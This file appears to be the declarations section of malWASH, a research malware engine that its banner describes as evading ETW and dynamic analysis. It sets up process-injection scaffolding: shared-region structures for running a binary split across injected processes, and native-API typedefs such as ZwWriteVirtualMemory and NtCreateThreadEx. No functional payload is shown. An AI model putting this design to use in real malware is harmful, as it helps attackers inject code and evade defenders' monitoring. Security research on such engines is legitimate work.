//-----------------------------------------------------------------------------------------------------------
/*  Original malWASH Code being modified by UCO 476365 Niraj Kalra
**  Original Author 
**  Kyriakos Ispoglou (ispo) - ispo@purdue.edu
**  Summer 2015 
**                               ,,                                                        
**                             `7MM `7MMF'     A     `7MF' db       .M"""bgd `7MMF'  `7MMF'
**                               MM   `MA     ,MA     ,V  ;MM:     ,MI    "Y   MM      MM  
**  `7MMpMMMb.pMMMb.   ,6"Yb.    MM    VM:   ,VVM:   ,V  ,V^MM.    `MMb.       MM      MM  
**    MM    MM    MM  8)   MM    MM     MM.  M' MM.  M' ,M  `MM      `YMMNq.   MMmmmmmmMM  
**    MM    MM    MM   ,pm9MM    MM     `MM A'  `MM A'  AbmmmqMA   .     `MM   MM      MM  
**    MM    MM    MM  8M   MM    MM      :MM;    :MM;  A'     VML  Mb     dM   MM      MM  
**  .JMML  JMML  JMML.`Moo9^Yo..JMML.     VF      VF .AMA.   .AMMA.P"Ybmmd"  .JMML.  .JMML.
**      
**  malWASH - The malware engine for evading ETW and dynamic analysis: A new dimension in APTs 
**  It contains loader's codes, the emulator() in an 
**  array and embeds the blocks, the segments and the binary's metadata into multiple arrays. !    
*/
//-----------------------------------------------------------------------------------------------------------
#include"stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include <stdio.h>
#include <stdarg.h>                                         // va_list, va_start, va_arg, va_end
#include <stddef.h>                                         // offsetof
#include <conio.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h> 
#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include <windowsx.h>
#include <tlhelp32.h>
#include <process.h> 

#pragma comment (lib, "Ws2_32.lib")                     // Need to link with Ws2_32.lib

//-----------------------------------------------------------------------------------------------------------

// constant definitions 
//-----------------------------------------------------------------------------------------------------------
#define FUNTBLSIZE      4096                                // max function table size
#define SEGMTABSIZE     32                                  // segment table size 
#define MAXNBLKS        1536                                // max number of blocks (they'll be many in paranoid mode)
#define MAXSEGNAMELEN   64                                  // max segment name length
#define MAXBLKSIZE      768                                 // max block size
#define MAXMODNAMELEN   64                                  // max imported module name length
#define MODTABSIZE      32                                  // module table size
#define MAXCONCURNPROC  16                                  // max number of injected processes ??
#define MAXOPENHANDLE   8                                   // max number of concurrent open SOCKETs/HANDLEs
#define MAILBOXSIZE     1024                                // mailbox size (1K is fine)
#define MAXMAILBOXSIZE  8                                   // maximum number of unread mails
#define STACKBASEADDR   0x19900000                          // stack virtual base address
#define STACKSIZE       0x20000                             // stack size
#define STACKBASEADDR2  0x19900040                          // different call caches for different dependencies
#define SEGMBASEADDR    0x1bb00000                          // 1st segment virtual base address
#define SEGMNXTOFF      0x20000                             // virtual offset between segment base address
#define HEAPBASEADDR    0x1cc00000                          // heap starts from here
#define NMAXTHREADS     4                                   // maximum number of threads that we can handle
#define ARGVBASEOFF     0x200                               // base address of argv table
#define ARGVPTRBASEOFF  0x240                               // base address of argv pointers 
#define ARGVNXTOFF      0x40                                // offset between argv pointers
#define THREAD_UNUSED   0xffff                              // thread does not exists
#define THREAD_RUNNING  0x0001                              // thread is running
#define CMD_WSASTARTUP  0x01                                // call WSAStartup()

//-----------------------------------------------------------------------------------------------------------
// type definitions
//-----------------------------------------------------------------------------------------------------------
typedef unsigned short int  ushort;
typedef unsigned char       byte;
typedef unsigned int        uint, addr;
typedef unsigned long int   ulong;
 
struct shctrl_t 
{
    // ----------------------------------------------------------------------------------
    char    signature[8];                                   // shared control region signature (OPTIONAL)
    ushort  reserved1,                                      // reserved
            nblks,                                          // total number of blocks
            nsegms,                                         // total number of segments
            nmods,                                          // total number of modules
            funtabsz,                                       // function table size
            nproc;                                          // number of injected proccesses
    ulong   nxtheapaddr;                                    // next address in heap to allocate

    ushort  nxtblk[ NMAXTHREADS ],                          // next block to execute (1 per thread)
            thrdst[ NMAXTHREADS ];                          // thread states    
    ulong   thrdrtn[ NMAXTHREADS ];                         // thread entry points
            
    char    spin;                                           // spin flag
    byte    reserved2[7];                                   // reserved for future use
    // ----------------------------------------------------------------------------------
    struct context_t {                                      // context switch struct (0x28 bytes)
        uint    eax;                                        // we store 8 basic registers + FLAGS
        uint    edx;                                        //
        uint    ecx;                                        //
        uint    ebx;                                        //
        uint    esi;                                        //
        uint    edi;                                        //
        uint    esp;                                        //
        uint    ebp;                                        // don't need eip
        uint    eflags;                                     //
        uint    reserved;                                   // reserved for future use

    } 
    ctx[ NMAXTHREADS ];                                     // context variable
    // ----------------------------------------------------------------------------------
    struct segm_t {                                         // segments information (0x10 bytes)
        ushort  segmid;                                     // segment id (optional, as segments are 
                                                            // sequential starting from 0)
        char    name[6];                                    // random name to identify shared region
        addr    startEA, endEA;                             // start and end RVAs
    } 
    segm[ SEGMTABSIZE ];                                    // store segments in an array
    // ----------------------------------------------------------------------------------
    struct modl_t {                                         // module information
                                                            // module id is used as an index
        char    name[ MAXMODNAMELEN ];                      // module name
        // ulong    reserved;

    } 
    modl[ MODTABSIZE ];                                     // store modules here
    // ----------------------------------------------------------------------------------
    struct blk_t {                                          // basic block information
                                                            // bid is used as index
        char    name[8];                                    // random name to identify shared region
        // ulong    reserved;
    } 
    blk[ MAXNBLKS ];                                        // store bid shared region names here
    // ----------------------------------------------------------------------------------
    char    funtab[ FUNTBLSIZE ];                           // function table
    byte    reserved3[ 8 ];                                 // reserved for future use
    // ----------------------------------------------------------------------------------
    ulong   pidtab[MAXCONCURNPROC];                         // table of all loaded pids
    // ----------------------------------------------------------------------------------
    struct duptab_entry {                                   // duplication table entry (72 bytes)
        ulong   origval;                                    // original value of SOCKET/HANDLE
        ushort  type;                                       // HANDLE or SOCKET?
        ushort  reserved3;                                  // for future use
        void    *handle[ MAXCONCURNPROC ];                  // SOCKET/HANDLE value
    } 
    duptab[ MAXOPENHANDLE ];                                // every open SOCKET/HANDLE has 1 entry
    // ----------------------------------------------------------------------------------
    struct mailbox_t {                                      // mailbox data type (1024 bytes)
        ushort  cmd,                                        // message command
                reserved;                                   // reserved value
        void*   handle;                                     // original SOCKET/HANDLE value
        ulong   reserved2[2];                               // another reserved value       
        
        byte    data[MAILBOXSIZE - 16];                     // message data
    }
    mailbox[ MAXCONCURNPROC ][ MAXMAILBOXSIZE ];            // 1 mailbox for each process
    // ----------------------------------------------------------------------------------
};
// ----------------------------------------------------------------------------------------------------------


// ----------------------------------------------------------------------------------------------------------
// native API definitions
// ----------------------------------------------------------------------------------------------------------
#ifdef __VAR_5_USE_NTAPI_FOR_INJECTION__

typedef struct _UNICODE_STRING {
    USHORT                  Length;
    USHORT                  MaximumLength;
    PWSTR                   Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG                   Length;
    HANDLE                  RootDirectory;
    PUNICODE_STRING         ObjectName;
    ULONG                   Attributes;
    PVOID                   SecurityDescriptor;
    PVOID                   SecurityQualityOfService;
}  OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    PVOID                   UniqueProcess;
    PVOID                   UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(__stdcall *_ZwOpenProcess)(
    PHANDLE                 ProcessHandle,
    ACCESS_MASK             DesiredAccess,
    POBJECT_ATTRIBUTES      ObjectAttributes,
    PCLIENT_ID              ClientId
);

typedef NTSTATUS(__stdcall *_ZwAllocateVirtualMemory)(
    HANDLE                  ProcessHandle,
    PVOID                   *BaseAddress,
    ULONG_PTR               ZeroBits,
    PSIZE_T                 RegionSize,
    ULONG                   AllocationType,
    ULONG                   Protect
);

typedef NTSTATUS(__stdcall *_ZwWriteVirtualMemory)(
    HANDLE                  ProcessHandle,
    PVOID                   BaseAddress,
    PVOID                   Buffer,
    ULONG                   NumberOfBytesToWrite,
    PULONG                  NumberOfBytesWritten OPTIONAL 
);

typedef struct _INITIAL_TEB {
    PVOID                   StackBase;
    PVOID                   StackLimit;
    PVOID                   StackCommit;
    PVOID                   StackCommitMax;
    PVOID                   StackReserved;
} INITIAL_TEB, *PINITIAL_TEB;


typedef NTSTATUS (__stdcall *_NtCreateThreadEx) (
    PHANDLE                 hThread,
    ACCESS_MASK             DesiredAccess,
    LPVOID                  ObjectAttributes,
    HANDLE                  ProcessHandle,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID                  lpParameter,
    BOOL                    CreateSuspended,
    ULONG                   StackZeroBits,
    ULONG                   SizeOfStackCommit,
    ULONG                   SizeOfStackReserve,
    LPVOID                  lpBytesBuffer
);

typedef NTSTATUS(__stdcall *_RtlCreateUserThread)(
    HANDLE                  ProcessHandle,
    PSECURITY_DESCRIPTOR    SecurityDescriptor OPTIONAL,
    BOOLEAN                 CreateSuspended,
    ULONG                   StackZeroBits,
    OUT PULONG              StackReserved,
    OUT PULONG              StackCommit,
    PVOID                   StartAddress,
    PVOID                   StartParameter OPTIONAL,
    PHANDLE                 ThreadHandle,
    PCLIENT_ID              ClientID 
);

struct NtCreateThreadExBuffer {
    ULONG                   Size;
    ULONG                   Unknown1;
    ULONG                   Unknown2;
    PULONG                  Unknown3;
    ULONG                   Unknown4;
    ULONG                   Unknown5;
    ULONG                   Unknown6;
    PULONG                  Unknown7;
    ULONG                   Unknown8;
 }; 

#define OBJ_CASE_INSENSITIVE   0x00000040
#define InitializeObjectAttributes( i, o, a, r, s ) { \
        (i)->Length = sizeof( OBJECT_ATTRIBUTES );    \
        (i)->RootDirectory = r;                       \
        (i)->Attributes = a;                          \
        (i)->ObjectName = o;                          \
        (i)->SecurityDescriptor = s;                  \
        (i)->SecurityQualityOfService = NULL;         \
    }

#ifndef STATUS_SUCCESS
    #define STATUS_SUCCESS 0x00000000
#endif

_ZwOpenProcess              ZwOpenProcess;
_ZwAllocateVirtualMemory    ZwAllocateVirtualMemory;
_ZwWriteVirtualMemory       ZwWriteVirtualMemory;
_NtCreateThreadEx           NtCreateThreadEx;
_RtlCreateUserThread        RtlCreateUserThread;
#endif

//-----------------------------------------------------------------------------------------------------------
// global definitions
//-----------------------------------------------------------------------------------------------------------
#define __ABORT_ON_INJECT_FAILURE__                     // abort execution on failure instead of returning false

HANDLE      threadid[ MAXCONCURNPROC ];                 // store all thread IDs here
int         sockstartup;                                // are sockets used?
void        *segbase[SEGMTABSIZE];                      // store segment base addresses
shctrl_t    *shctrl;                                    // global shared control region

